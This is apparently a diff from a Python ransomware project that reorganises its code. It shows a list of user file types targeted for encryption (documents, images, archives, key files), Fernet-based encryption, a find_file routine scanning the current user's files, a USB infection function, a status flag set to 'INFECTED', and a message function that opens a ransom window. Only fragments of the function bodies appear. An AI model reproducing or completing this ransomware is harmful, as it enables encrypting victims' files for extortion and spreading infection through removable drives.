@@ -6,12 +6,21 @@ import stat
 import time
 
 import sys
-import win32con
 import win32gui
 from cryptography.fernet import Fernet
 
 
 status = 'INFECTED'
+
+
+f_name = []
+targets = ('.txt', '.docx', '.doc', '.lnk',
+           '.xlsx', '.pdf', '.zip', '.ppt',
+           '.jpg', '.jpeg', 'gif', '.mp3',
+           '.mp4', '.svg', '.ico', '.3gp',
+           'ink', '.gz', '.rar', '.wav',
+           '.iso', '.java', '.html', '.css',
+           '.key', '.enc')
 
 
 def virus_property():
@@ -66,16 +75,6 @@ def usb_infection():
         pass
 
 
-f_name = []
-targets = ('.txt', '.docx', '.doc', '.lnk',
-           '.xlsx', '.pdf', '.zip', '.ppt',
-           '.jpg', '.jpeg', 'gif', '.mp3',
-           '.mp4', '.svg', '.ico', '.3gp',
-           'ink', '.gz', '.rar', '.wav',
-           '.iso', '.java', '.html', '.css',
-           '.key', '.enc')
-
-
 def find_file():
     usr = getpass.getuser()
     # Get files to encrypt from current user
@@ -107,7 +106,7 @@ def encrypt_file():
 
 def message():
     # this function prompts a window containing the ransom message
-    import gui
+    from Gui import gui
     gui.gui()
 
 
